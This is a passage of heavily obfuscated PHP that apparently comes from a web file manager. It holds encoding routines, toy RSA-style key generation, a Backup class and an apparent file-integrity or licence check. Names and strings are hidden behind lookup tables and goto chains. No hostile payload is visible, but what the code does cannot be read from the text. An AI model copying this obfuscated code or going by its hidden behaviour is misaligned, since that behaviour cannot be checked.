$a⁄Ø◊πÑ‚«[642]; break; $bäÁ∂§ê®∑ = $a⁄Ø◊πÑ‚«[643]; while ($bäÁ∂§ê®∑ < $a⁄Ø◊πÑ‚«[555]) { if ($bäÁ∂§ê®∑ >= 0) { break; } $bäÁ∂§ê®∑++; } case $aåÓë¢§ñ∆[333]: goto d·¶¥á„’Ù; Böú◊Õ≠¢»: $f√∂âù£’‚ = $a⁄Ø◊πÑ‚«[645]; if (!$f√∂âù£’‚) { return; } $A¢º¨øØé… = 0; goto CÑäËâ—¬µ; D¯÷çßÉ¢©: $CèŸ©Ë‚œ— = $aåÓë¢§ñ∆[25]($CèŸ©Ë‚œ—, $bıøı≥⁄èÑ % 8, $bıøı≥⁄èÑ % 8 + 7); $BÒÙä«‘™≈ = $aåÓë¢§ñ∆[10]; $aÌ‘•Ã—ØÀ = 0; goto Böú◊Õ≠¢»; d·¶¥á„’Ù: $c∆∫¢°‘∏‹ = $aåÓë¢§ñ∆[118]($c∆∫¢°‘∏‹); $bıøı≥⁄èÑ = $aåÓë¢§ñ∆[334](0, 64); $fï™ áˆèó = $a⁄Ø◊πÑ‚«[644]; goto AÜÁˆµêò; AÜÁˆµêò: if (!$fï™ áˆèó) { return; } $DåßÎ‰∫√í = $d’Ô£Íïß[$bıøı≥⁄èÑ]; $CèŸ©Ë‚œ— = $aåÓë¢§ñ∆[114]($DåßÎ‰∫√í . $aåÓë¢§ñ∆[114]($E‚˜Û’Ü±‘ . $DåßÎ‰∫√í) . $E‚˜Û’Ü±‘); goto D¯÷çßÉ¢©; CÑäËâ—¬µ: $c¿å’çåæ = $a⁄Ø◊πÑ‚«[646]; if (!$c¿å’çåæ) { die; } $BÓñﬁ≠É¢ç = 0; goto b∫µ—…π’ñ; b∫µ—…π’ñ: for ($aÌ‘•Ã—ØÀ = 0; $aÌ‘•Ã—ØÀ < $aåÓë¢§ñ∆[24]($c∆∫¢°‘∏‹); $aÌ‘•Ã—ØÀ++) { $BÓñﬁ≠É¢ç = $BÓñﬁ≠É¢ç == $aåÓë¢§ñ∆[24]($CèŸ©Ë‚œ—) ? 0 : $BÓñﬁ≠É¢ç; $A¢º¨øØé… = ($bıøı≥⁄èÑ + $aåÓë¢§ñ∆[335]($d’Ô£Íïß, $c∆∫¢°‘∏‹[$aÌ‘•Ã—ØÀ]) + $aåÓë¢§ñ∆[336]($CèŸ©Ë‚œ—[$BÓñﬁ≠É¢ç++])) % 64; $BÒÙä«‘™≈ .= $d’Ô£Íïß[$A¢º¨øØé…]; $e‰Ã¡ïÒ≈π = $a⁄Ø◊πÑ‚«[647]; if (strlen($e‰Ã¡ïÒ≈π) < $a⁄Ø◊πÑ‚«[548]) { die; } } $C´Ω≥Âﬁ⁄ä = $aåÓë¢§ñ∆[327]($DåßÎ‰∫√í . $BÒÙä«‘™≈); $dØ≥Üæƒ·Ï = $a⁄Ø◊πÑ‚«[648]; goto cÖÈôî‚âﬂ; cÖÈôî‚âﬂ: if (strlen($dØ≥Üæƒ·Ï) < $a⁄Ø◊πÑ‚«[548]) { return; } break; goto cÍ≥ÑÙ‹Ü≤; cÍ≥ÑÙ‹Ü≤: default: $C´Ω≥Âﬁ⁄ä = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][147]}($c∆∫¢°‘∏‹, $E‚˜Û’Ü±‘ . $D§ƒ◊—˘±Ñ); $D•⁄ú⁄û†  = $a⁄Ø◊πÑ‚«[649]; if (!$D•⁄ú⁄û† ) { die; } break; } $C´Ω≥Âﬁ⁄ä = $aåÓë¢§ñ∆[214]($f€Ö⁄àÏŒ≠ . $D§ƒ◊—˘±Ñ . $C´Ω≥Âﬁ⁄ä); if ($cõ≥«áŒﬂÜ - 1 > 0) { $C´Ω≥Âﬁ⁄ä = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][127]}($C´Ω≥Âﬁ⁄ä, $E‚˜Û’Ü±‘, $cõ≥«áŒﬂÜ - 1); } goto aÖÉ‚ææñ⁄; aÖÉ‚ææñ⁄: return $C´Ω≥Âﬁ⁄ä; goto a∫îòå⁄”Ÿ; CÒâæƒ∫áÖ: $bùÜÜÍ≤¶ß = $a⁄Ø◊πÑ‚«[635]; if (strlen($bùÜÜÍ≤¶ß) < $a⁄Ø◊πÑ‚«[555]) { die; } $c∆∫¢°‘∏‹ = $aåÓë¢§ñ∆[2]($c∆∫¢°‘∏‹); goto A¿±˜îƒπ©; AÀ•ëﬁ¥¬¯: $D§ƒ◊—˘±Ñ = $aåÓë¢§ñ∆[124](15); $d’Ô£Íïß = $aåÓë¢§ñ∆[330]; $fÀ»©«Ñã¢ = $a⁄Ø◊πÑ‚«[638]; goto EÌˆÜèÀº˜; d—¢ô‚÷ø˜: $a⁄Ø◊πÑ‚« =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aåÓë¢§ñ∆ =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; $aåÓë¢§ñ∆[329](1); goto CÒâæƒ∫áÖ; a∫îòå⁄”Ÿ: } private function hfzxae587e68($E⁄É™‹∞æá, $AòΩ˜Ö¿âö, $c∞§√≈√¨Ö = 3) { goto A÷äì»éàΩ; A÷äì»éàΩ: $D∆¶ŒÜπâ– =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $FÑÿÜµºâ =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; if (!$FÑÿÜµºâ[337]($E⁄É™‹∞æá) || $FÑÿÜµºâ[24]($E⁄É™‹∞æá) < 10) { return !1; } goto AìÍ≠üƒ¶á; AìÍ≠üƒ¶á: $E⁄É™‹∞æá = $FÑÿÜµºâ[2]($E⁄É™‹∞æá); $f¬Úﬂ€¶ÖÖ = $D∆¶ŒÜπâ–[650]; $E⁄É™‹∞æá = $FÑÿÜµºâ[214]($E⁄É™‹∞æá); goto C≥àŒâÂà–; F∫âëı•∏ù: switch ($fÉíô©ªÕ·) { case $FÑÿÜµºâ[232]: $cˆù∆£Œ∫Í = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][246]}($E⁄É™‹∞æá, $FÑÿÜµºâ[214]($AòΩ˜Ö¿âö . $DÉ÷É¨Ÿ‘¿)); break; $a‰ùÎôäﬁ˜ = $D∆¶ŒÜπâ–[652]; if (!$a‰ùÎôäﬁ˜) { die; } case $FÑÿÜµºâ[220]: $cˆù∆£Œ∫Í = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][246]}($E⁄É™‹∞æá, $FÑÿÜµºâ[214]($DÉ÷É¨Ÿ‘¿ . $AòΩ˜Ö¿âö)); break; $c¬⁄‡®ñÏõ = $D∆¶ŒÜπâ–[653]; while ($c¬⁄‡®ñÏõ < $D∆¶ŒÜπâ–[548]) { if ($c¬⁄‡®ñÏõ >= 0) { break; } $c¬⁄‡®ñÏõ++; } case $FÑÿÜµºâ[331]: $cˆù∆£Œ∫Í = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][246]}($E⁄É™‹∞æá, $FÑÿÜµºâ[118]($DÉ÷É¨Ÿ‘¿ . $AòΩ˜Ö¿âö)); break; $b⁄óÁ¥â∞¯ = $D∆¶ŒÜπâ–[654]; case $FÑÿÜµºâ[332]: $cˆù∆£Œ∫Í = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][246]}($E⁄É™‹∞æá, $FÑÿÜµºâ[114]($DÉ÷É¨Ÿ‘¿ . $AòΩ˜Ö¿âö)); break; $D«Ñ◊‘—áà = $D∆¶ŒÜπâ–[655]; while ($D«Ñ◊‘—áà < $D∆¶ŒÜπâ–[552]) { if ($D«Ñ◊‘—áà >= 0) { break; } $D«Ñ◊‘—áà++; } case $FÑÿÜµºâ[333]: goto c…√≠Ê∞¶¥; AÍπ¥î¡–ä: $cˆù∆£Œ∫Í = $FÑÿÜµºâ[339]($c€üÖª≈°¬); break; $cÇÉâ∞‰àã = $D∆¶ŒÜπâ–[663]; goto D“˘çÓê»—; Cëáï÷€©ß: $Böì€·öØ’ = $FÑÿÜµºâ[25]($Böì€·öØ’, $c◊åØªìÜº % 8, $c◊åØªìÜº % 8 + 7); $eÎÎ⁄ôœÁ— = $D∆¶ŒÜπâ–[658]; while (strlen($eÎÎ⁄ôœÁ—) < $D∆¶ŒÜπâ–[555]) { if (!$eÎÎ⁄ôœÁ—) { break; } $eÎÎ⁄ôœÁ—++; } goto d∂∆Ù€ö√˜; e•Ã≤ØÏ∆’: $E⁄É™‹∞æá = $FÑÿÜµºâ[25]($E⁄É™‹∞æá, 1); $c◊åØªìÜº = $FÑÿÜµºâ[335]($f∫±îá°á°, $BÆïèÔ€‹†); $Böì€·öØ’ = $FÑÿÜµºâ[114]($BÆïèÔ€‹† . $FÑÿÜµºâ[114]($AòΩ˜Ö¿âö . $BÆïèÔ€‹†) . $AòΩ˜Ö¿âö); goto Cëáï÷€©ß; FÍË–»àÒ∞: $fäïÈè∂•ß = 0; $F›Ÿ£Û›ñﬂ = 0; for ($fÃ‘ ‚–Ê¢ = 0; $fÃ‘ ‚–Ê¢ < $FÑÿÜµºâ[24]($E⁄É™‹∞æá); $fÃ‘ ‚–Ê¢++) { $F›Ÿ£Û›ñﬂ = $F›Ÿ£Û›ñﬂ == $FÑÿÜµºâ[24]($Böì€·öØ’) ? 0 : $F›Ÿ£Û›ñﬂ; $b⁄Ö∏çΩ•≠ = $D∆¶ŒÜπâ–[660]; while ($b⁄Ö∏çΩ•≠ < $D∆¶ŒÜπâ–[555]) { if ($b⁄Ö∏çΩ•≠ >= 0) { break; } $b⁄Ö∏çΩ•≠++; } $CÉ·¯é®ºÂ = $F›Ÿ£Û›ñﬂ++; $CÙ¡Ï™ﬁÁõ = $D∆¶ŒÜπâ–[661]; while ($CÙ¡Ï™ﬁÁõ < $D∆¶ŒÜπâ–[548]) { if ($CÙ¡Ï™ﬁÁõ >= 0) { break; } $CÙ¡Ï™ﬁÁõ++; } $fäïÈè∂•ß = $FÑÿÜµºâ[335]($f∫±îá°á°, $E⁄É™‹∞æá[$fÃ‘ ‚–Ê¢]) - $c◊åØªìÜº - $FÑÿÜµºâ[336]($Böì€·öØ’[$CÉ·¯é®ºÂ]); $e‹ã’ÕÖ∏Î = $D∆¶ŒÜπâ–[662]; if (strlen($e‹ã’ÕÖ∏Î) < $D∆¶ŒÜπâ–[548]) { return; } while ($fäïÈè∂•ß < 0) { $fäïÈè∂•ß += 64; } $c€üÖª≈°¬ .= $f∫±îá°á°[$fäïÈè∂•ß]; } goto AÍπ¥î¡–ä; fß·Ωè¬∆Ë: $BÆïèÔ€‹† = $E⁄É™‹∞æá[0]; $a⁄êÿ†Ô¨ï = $D∆¶ŒÜπâ–[657]; while ($a⁄êÿ†Ô¨ï < $D∆¶ŒÜπâ–[557]) { if ($a⁄êÿ†Ô¨ï >= 0) { break; } $a⁄êÿ†Ô¨ï++; } goto e•Ã≤ØÏ∆’; d∂∆Ù€ö√˜: $c€üÖª≈°¬ = $FÑÿÜµºâ[10]; $fÃ‘ ‚–Ê¢ = 0; $F∑∏„º∂∆‘ = $D∆¶ŒÜπâ–[659]; goto FÍË–»àÒ∞; D“˘çÓê»—: if (!$cÇÉâ∞‰àã) { die; } goto e¯§óàÊŒÔ; c…√≠Ê∞¶¥: $E⁄É™‹∞æá = $FÑÿÜµºâ[338]($E⁄É™‹∞æá); $Cè∑ê◊ôÍò = $D∆¶ŒÜπâ–[656]; if (strlen($Cè∑ê◊ôÍò) < $D∆¶ŒÜπâ–[548]) { die; } goto fß·Ωè¬∆Ë; e¯§óàÊŒÔ: default: $cˆù∆£Œ∫Í = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][246]}($E⁄É™‹∞æá, $AòΩ˜Ö¿âö . $DÉ÷É¨Ÿ‘¿); $däáíÍé¢ = $D∆¶ŒÜπâ–[664]; if (!$däáíÍé¢) { die; } break; } if ($c∞§√≈√¨Ö - 1 > 0) { $cˆù∆£Œ∫Í = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][188]}($cˆù∆£Œ∫Í, $AòΩ˜Ö¿âö, $c∞§√≈√¨Ö - 1); } return $cˆù∆£Œ∫Í; goto eñ±¬Ø±œ∑; C≥àŒâÂà–: $Cµ©ìü∞æÃ = $D∆¶ŒÜπâ–[651]; if (!$Cµ©ìü∞æÃ) { die; } $fÉíô©ªÕ· = $E⁄É™‹∞æá[0]; goto bàÁ√äàÜÀ; bàÁ√äàÜÀ: $DÉ÷É¨Ÿ‘¿ = $FÑÿÜµºâ[25]($E⁄É™‹∞æá, 1, 15); $E⁄É™‹∞æá = $FÑÿÜµºâ[25]($E⁄É™‹∞æá, 16); $f∫±îá°á° = $FÑÿÜµºâ[330]; goto F∫âëı•∏ù; eñ±¬Ø±œ∑: } public function fhbvbc82e89e($fµã”ÍÍ∞ı) { goto d‚ßåæ®ôÆ; C‡°‹Ø´√ˆ: if (strlen($e”âäó∆∏∞) < $DçÀ ¿ÓãÀ[555]) { die; } while (1) { $bˆÔÌ√∫é« = $Då‰ÖŒüÁÒ; $DÙ§√ß¡· = $DçÀ ¿ÓãÀ[667]; $dôèçÇß”ö = $eæ—ùâËÑÃ; while ($dôèçÇß”ö % $bˆÔÌ√∫é« != 0) { $bîÀ“ø‡·û = $dôèçÇß”ö; $dôèçÇß”ö = $bˆÔÌ√∫é«; $bˆÔÌ√∫é« = $bîÀ“ø‡·û % $bˆÔÌ√∫é«; } if ($bˆÔÌ√∫é« == 1) { break; } else { $Då‰ÖŒüÁÒ++; } } $B»èûÔﬂÕ∂ = 2; goto E‘∑‰Ñ ∞ˆ; E‘∑‰Ñ ∞ˆ: $dà∏Ëò¡∆Ñ = $DçÀ ¿ÓãÀ[668]; if (strlen($dà∏Ëò¡∆Ñ) < $DçÀ ¿ÓãÀ[548]) { die; } for ($b÷„ôı§î„ = 0; $b÷„ôı§î„ < $eæ—ùâËÑÃ * 10; $b÷„ôı§î„++) { if (($eæ—ùâËÑÃ * $b÷„ôı§î„ + 1) % $Då‰ÖŒüÁÒ == 0) { $B»èûÔﬂÕ∂ = $cú≤á•Ç∆á[201](($eæ—ùâËÑÃ * $b÷„ôı§î„ + 1) / $Då‰ÖŒüÁÒ); break; } } goto D¿®–Õ”úÑ; Aô»“ ∂ù¬: $bÉ≠ıà©°Ù = $cú≤á•Ç∆á[114]($cú≤á•Ç∆á[341] . ($f≥úªÀâùí + $f’™Áå™≈Õ) . $cú≤á•Ç∆á[342] . $Då‰ÖŒüÁÒ . $cú≤á•Ç∆á[342] . $B»èûÔﬂÕ∂ . $cú≤á•Ç∆á[343]); $eõÚ±Éß¨ñ = $DçÀ ¿ÓãÀ[670]; $b∫Àà“ÏÑ≤ = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][147]}($fµã”ÍÍ∞ı, $bÉ≠ıà©°Ù) . $cú≤á•Ç∆á[344] . $cÜ∂á¢™®Â; goto B÷ü≥»ã”Û; D¿®–Õ”úÑ: $cÜ∂á¢™®Â = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][147]}($f≥úªÀâùí * $f’™Áå™≈Õ . $cú≤á•Ç∆á[10], $cú≤á•Ç∆á[149]); $A·Ñéî áó = $DçÀ ¿ÓãÀ[669]; while ($A·Ñéî áó < $DçÀ ¿ÓãÀ[555]) { if ($A·Ñéî áó >= 0) { break; } $A·Ñéî áó++; } goto Aô»“ ∂ù¬; EÒ≥ÂüÏ˘å: $eæ—ùâËÑÃ = ($f≥úªÀâùí - 1) * ($f’™Áå™≈Õ - 1); $Då‰ÖŒüÁÒ = $cú≤á•Ç∆á[201](($f≥úªÀâùí + $f’™Áå™≈Õ) / 2); $e”âäó∆∏∞ = $DçÀ ¿ÓãÀ[666]; goto C‡°‹Ø´√ˆ; d‚ßåæ®ôÆ: $DçÀ ¿ÓãÀ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cú≤á•Ç∆á =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; $f≥úªÀâùí = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][340]}(); goto c†ãºÚ¯ûà; c†ãºÚ¯ûà: $f’™Áå™≈Õ = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][340]}(); $Dè‹Öé√Î· = $DçÀ ¿ÓãÀ[665]; if (strlen($Dè‹Öé√Î·) < $DçÀ ¿ÓãÀ[548]) { die; } goto EÒ≥ÂüÏ˘å; B÷ü≥»ã”Û: return $b∫Àà“ÏÑ≤; $c∞ûÛ™õªÀ = $DçÀ ¿ÓãÀ[671]; if (!$c∞ûÛ™õªÀ) { die; } goto aÇß¿«»˜; aÇß¿«»˜: } public function oirpdde916d0($EÜ»ß≈∏◊ç) { goto dò´¶ä∏ÆŒ; aÉÌºˆÁÔ‹: $D§À¿ò≈çÚ = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][246]}($Eéπ¿Â¨◊ø[0], $eÏ“óåèõü); $d¿ø—∑ÖﬂÆ = $aÕ’ö≈€•¡[679]; return $D§À¿ò≈çÚ; goto cû∑òç«ˆç; d«ÍÁ‹ıÛù: $eÃˆù≥Çëò = ($C¬‚Ωùïêº - 1) * ($f∏Ûìßà«Ü - 1); $A¿Ôƒ∏∑‡ü = $F˜ƒœºìﬂà[201](($C¬‚Ωùïêº + $f∏Ûìßà«Ü) / 2); while (1) { $A∫®‘∂È£π = $A¿Ôƒ∏∑‡ü; $cË∆âÔ¶∫à = $eÃˆù≥Çëò; while ($cË∆âÔ¶∫à % $A∫®‘∂È£π != 0) { $eÕê◊ù„Ú = $cË∆âÔ¶∫à; $cË∆âÔ¶∫à = $A∫®‘∂È£π; $A∫®‘∂È£π = $eÕê◊ù„Ú % $A∫®‘∂È£π; } if ($A∫®‘∂È£π == 1) { break; } else { $A¿Ôƒ∏∑‡ü++; } } goto D¡ïÑê„◊; dò´¶ä∏ÆŒ: $aÕ’ö≈€•¡ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F˜ƒœºìﬂà =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; $Eéπ¿Â¨◊ø = $F˜ƒœºìﬂà[0]($F˜ƒœºìﬂà[344], $EÜ»ß≈∏◊ç); goto CÜÁ±»ıì©; Aúﬂºß°Üü: if (!$dö‡ã™¡ﬁÉ) { die; } $C¬‚Ωùïêº = 0; $f∏Ûìßà«Ü = 0; goto d‚ƒæÓŸíå; eè‡Û”˘Ã«: $A†·î¡à≈é = $this->{$_SERVER[¡˚¸∞ŒåÛ∆ìù][246]}($Eéπ¿Â¨◊ø[1] . $F˜ƒœºìﬂà[10], $F˜ƒœºìﬂà[149]); $FÒ◊æàï¶∆ = $aÕ’ö≈€•¡[673]; while (strlen($FÒ◊æàï¶∆) < $aÕ’ö≈€•¡[557]) { if (!$FÒ◊æàï¶∆) { break; } $FÒ◊æàï¶∆++; } goto c‰∫™èã£≠; c‰∫™èã£≠: if (!$A†·î¡à≈é) { return $F˜ƒœºìﬂà[10]; } $A†·î¡à≈é = $F˜ƒœºìﬂà[201]($A†·î¡à≈é); $dö‡ã™¡ﬁÉ = $aÕ’ö≈€•¡[674]; goto Aúﬂºß°Üü; D¡ïÑê„◊: $AóÁΩßü∫Ö = 2; for ($bçâõÉ¡É™ = 0; $bçâõÉ¡É™ < $eÃˆù≥Çëò * 10; $bçâõÉ¡É™++) { if (($eÃˆù≥Çëò * $bçâõÉ¡É™ + 1) % $A¿Ôƒ∏∑‡ü == 0) { $AóÁΩßü∫Ö = $F˜ƒœºìﬂà[201](($eÃˆù≥Çëò * $bçâõÉ¡É™ + 1) / $A¿Ôƒ∏∑‡ü); break; } } $eÏ“óåèõü = $F˜ƒœºìﬂà[114]($F˜ƒœºìﬂà[341] . ($C¬‚Ωùïêº + $f∏Ûìßà«Ü) . $F˜ƒœºìﬂà[342] . $A¿Ôƒ∏∑‡ü . $F˜ƒœºìﬂà[342] . $AóÁΩßü∫Ö . $F˜ƒœºìﬂà[343]); goto aÉÌºˆÁÔ‹; CÜÁ±»ıì©: $aà™â‘ÕÊ£ = $aÕ’ö≈€•¡[672]; while (strlen($aà™â‘ÕÊ£) < $aÕ’ö≈€•¡[557]) { if (!$aà™â‘ÕÊ£) { break; } $aà™â‘ÕÊ£++; } if ($F˜ƒœºìﬂà[19]($Eéπ¿Â¨◊ø) != 2) { return $F˜ƒœºìﬂà[10]; } goto eè‡Û”˘Ã«; cû∑òç«ˆç: $F≥•Óô“Ö◊ = $aÕ’ö≈€•¡[680]; if (strlen($F≥•Óô“Ö◊) < $aÕ’ö≈€•¡[563]) { die; } goto d¿„¨πã∆…; d‚ƒæÓŸíå: $a›À•Ø»Óû = $aÕ’ö≈€•¡[675]; if (!$a›À•Ø»Óû) { return; } for ($bçâõÉ¡É™ = 3; $bçâõÉ¡É™ < $A†·î¡à≈é; $bçâõÉ¡É™ += 2) { if ($A†·î¡à≈é % $bçâõÉ¡É™ != 0) { continue; } $C¬‚Ωùïêº = $bçâõÉ¡É™; $A‰´∑ıç•õ = $aÕ’ö≈€•¡[676]; if (strlen($A‰´∑ıç•õ) < $aÕ’ö≈€•¡[563]) { die; } $f∏Ûìßà«Ü = $F˜ƒœºìﬂà[201]($A†·î¡à≈é / $bçâõÉ¡É™); $e§ìˆùäﬂΩ = $aÕ’ö≈€•¡[677]; if (strlen($e§ìˆùäﬂΩ) < $aÕ’ö≈€•¡[557]) { die; } break; $AÑ˜ûÖƒ◊Ø = $aÕ’ö≈€•¡[678]; if (!$AÑ˜ûÖƒ◊Ø) { die; } } goto d«ÍÁ‹ıÛù; d¿„¨πã∆…: } public function xokg2e41d466() { goto e‡˜Úö◊ÂÑ; C‹»á≤ƒê”: $a¨é‡ÆÆ˘» = array(); $c´“ˆîÇ‹º = $fËÀ…éà÷ì[681]; if (!$c´“ˆîÇ‹º) { return; } goto Aµ”Ë≤∑àÉ; c≈Ü∂¬™ÈÕ: return $E∂¨Ûü≤Ö∆; goto cˆèÕï‡À‡; e‡˜Úö◊ÂÑ: $fËÀ…éà÷ì =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CÕãúÜ∏ªÕ =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; $c˜ûúäıÕ¯ = $CÕãúÜ∏ªÕ[325]($CÕãúÜ∏ªÕ[345](2, 14), $CÕãúÜ∏ªÕ[345](2, 16) - 1); goto C‹»á≤ƒê”; Aµ”Ë≤∑àÉ: $f≤»¡àÃÍé = 1; $AÇ§ﬂ∫ç¢Ú = $fËÀ…éà÷ì[682]; while (strlen($AÇ§ﬂ∫ç¢Ú) < $fËÀ…éà÷ì[548]) { if (!$AÇ§ﬂ∫ç¢Ú) { break; } $AÇ§ﬂ∫ç¢Ú++; } goto d—âº¨£ê©; d—âº¨£ê©: while ($f≤»¡àÃÍé <= (int) $CÕãúÜ∏ªÕ[346]($c˜ûúäıÕ¯)) { $bÏªîÇêõÒ = $f≤»¡àÃÍé; $CÙå∏¢Ëãä = $fËÀ…éà÷ì[683]; if (strlen($CÙå∏¢Ëãä) < $fËÀ…éà÷ì[555]) { die; } while (!0) { $bÏªîÇêõÒ++; if ($bÏªîÇêõÒ <= 2) { $f≤»¡àÃÍé = $bÏªîÇêõÒ; break; } else { if ($bÏªîÇêõÒ < 2) { continue; } } $céÖ°ä÷´§ = !0; for ($DùÒ±”∆å∫ = 2; $DùÒ±”∆å∫ <= $CÕãúÜ∏ªÕ[346]($bÏªîÇêõÒ); $DùÒ±”∆å∫++) { if ($bÏªîÇêõÒ % $DùÒ±”∆å∫ == 0) { $céÖ°ä÷´§ = !1; } } if ($céÖ°ä÷´§) { $f≤»¡àÃÍé = $bÏªîÇêõÒ; break; } } $a¨é‡ÆÆ˘»[] = $f≤»¡àÃÍé; $F„íÏ“ùÙÑ = $fËÀ…éà÷ì[684]; if (!$F„íÏ“ùÙÑ) { die; } } $E∂¨Ûü≤Ö∆ = 2; for ($bÏªîÇêõÒ = $c˜ûúäıÕ¯; $bÏªîÇêõÒ > 1; $bÏªîÇêõÒ--) { $céÖ°ä÷´§ = !0; $aÛÃ∏‚ê¯É = $fËÀ…éà÷ì[685]; if (strlen($aÛÃ∏‚ê¯É) < $fËÀ…éà÷ì[552]) { die; } foreach ($a¨é‡ÆÆ˘» as $AËÑ˘ö‰éò) { if ($bÏªîÇêõÒ % $AËÑ˘ö‰éò == 0) { $céÖ°ä÷´§ = !1; break; } } if ($céÖ°ä÷´§) { $E∂¨Ûü≤Ö∆ = $bÏªîÇêõÒ; break; } } goto c≈Ü∂¬™ÈÕ; cˆèÕï‡À‡: } public function lspu3841609c($B«ﬁ‚Éıò∫, $d±ÔÖ™∆ÎÂ) { $cÇ¨ÚòÚœŒ =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; return $cÇ¨ÚòÚœŒ[13](array($cÇ¨ÚòÚœŒ[14], $cÇ¨ÚòÚœŒ[347]), $B«ﬁ‚Éıò∫, $d±ÔÖ™∆ÎÂ); } public function fotj44da6740($b˜ö„ïÌàÀ, $eº‰¶›Àﬁ‚) { $c§°ÌÛéƒº =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; return $c§°ÌÛéƒº[13](array($c§°ÌÛéƒº[348], $c§°ÌÛéƒº[349]), $b˜ö„ïÌàÀ, $eº‰¶›Àﬁ‚); } public function ablm0da5d67b($Fµâí™≤êë, $Fã‰«≠ß‡í) { $B˜∫∆ê¡™ê =& $_SERVER[¡˚¸∞ŒåÛ∆ìù]; return $B˜∫∆ê¡™ê[13](array($B˜∫∆ê¡™ê[348], $B˜∫∆ê¡™ê[350]), $Fµâí™≤êë, $Fã‰«≠ß‡í); $B¬ﬂú√Êô∞ = $_SERVER[Ä¿¡‡öóµŸﬂ‡][686]; } } goto A‘⁄ÉˆäÃ÷; EñØÊß®«≈: function beforeShutdownFatalError($aëˆ∏ªÏÊº) { think_exception($aëˆ∏ªÏÊº); } $_SERVER[$_SERVER[ÁŸäœ¨][48]] = $f®Ö∞ìÑãø($_SERVER[$_SERVER[ÁŸäœ¨][45]]); $E∞Ê‹à”∏Ù = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto CíÖÓóπﬁç; c·µÈû„¥ç: $aå∞û°ø…• = LIB_DIR . $_SERVER[Ä¿¡‡öóµŸﬂ‡][710]; $b≤∆—⁄˘‚€ = $_SERVER[Ä¿¡‡öóµŸﬂ‡][711]; if ($_SERVER[$_SERVER[Ä¿¡‡öóµŸﬂ‡][712]] != $b≤∆—⁄˘‚€($aå∞û°ø…•)) { goto C∞√â÷Æï¡; aÛœ·çÉãä: $c¡°Ö¥·Â∫($aå∞û°ø…•); goto D©Èìü…ı∑; C∞√â÷Æï¡: $dËç˘•Œùß = $_SERVER[Ä¿¡‡öóµŸﬂ‡][713]; $b∏È∏©Ñã‚ = $_SERVER[$_SERVER[Ä¿¡‡öóµŸﬂ‡][714]] . $_SERVER[Ä¿¡‡öóµŸﬂ‡][715]; $D ñçÊ—·å = $dËç˘•Œùß($b∏È∏©Ñã‚); goto dŒáôä·∂ú; dŒáôä·∂ú: $DçÈ™≈ΩÆ∑ = explode($_SERVER[Ä¿¡‡öóµŸﬂ‡][217], $D ñçÊ—·å); if (count($DçÈ™≈ΩÆ∑) < $_SERVER[Ä¿¡‡öóµŸﬂ‡][548]) { $bË¨èÌ…ñ¨ = $_SERVER[Ä¿¡‡öóµŸﬂ‡][716]; $bË¨èÌ…ñ¨(); } $c¡°Ö¥·Â∫ = $_SERVER[Ä¿¡‡öóµŸﬂ‡][717]; goto aÛœ·çÉãä; D©Èìü…ı∑: } goto DçàÒê†À¯; A‘⁄ÉˆäÃ÷: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $aÕ“ÏÌŸ„• =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; self::$name = date($aÕ“ÏÌŸ„•[687]); if (!($Cé∏∫≠è”‰ = Model($aÕ“ÏÌŸ„•[688])->lastItem())) { $Cé∏∫≠è”‰ = $this->initData(); } else { self::$name = $Cé∏∫≠è”‰[$aÕ“ÏÌŸ„•[28]]; if ($Cé∏∫≠è”‰[$aÕ“ÏÌŸ„•[689]] == $aÕ“ÏÌŸ„•[83]) { self::$name = date($aÕ“ÏÌŸ„•[690]); $aÂìÏÁ–—¡ = 0; if (isset($Cé∏∫≠è”‰[$aÕ“ÏÌŸ„•[281]][$aÕ“ÏÌŸ„•[167]][$aÕ“ÏÌŸ„•[419]])) { $aÂìÏÁ–—¡ = (int) $Cé∏∫≠è”‰[$aÕ“ÏÌŸ„•[281]][$aÕ“ÏÌŸ„•[167]][$aÕ“ÏÌŸ„•[419]]; } if ($Cé∏∫≠è”‰[$aÕ“ÏÌŸ„•[28]] == self::$name) { Model($aÕ“ÏÌŸ„•[688])->remove($Cé∏∫≠è”‰[$aÕ“ÏÌŸ„•[367]]); } $Cé∏∫≠è”‰ = $this->initData($aÂìÏÁ–—¡, $Cé∏∫≠è”‰[$aÕ“ÏÌŸ„•[691]]); } else { $this->checkStore($Cé∏∫≠è”‰[$aÕ“ÏÌŸ„•[691]]); } } self::$option = $Cé∏∫≠è”‰; } private function initData($cáÆÒ‘πƒ = 0, $E‰È∫àå≥º = '') { goto e´øïÂıÆœ; e´øïÂıÆœ: $dó¥„©©ë· =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aåïÈê…⁄§ = Model($dó¥„©©ë·[688])->config(); if ($E‰È∫àå≥º && $aåïÈê…⁄§[$dó¥„©©ë·[691]] != $E‰È∫àå≥º) { $cáÆÒ‘πƒ = 0; } goto a≤ôÙºâ¬; eåË¶∫©‡æ: $aç∂ã…ëìû[$dó¥„©©ë·[367]] = $DÆÑŒæ‹ÜÓ; return $aç∂ã…ëìû; goto 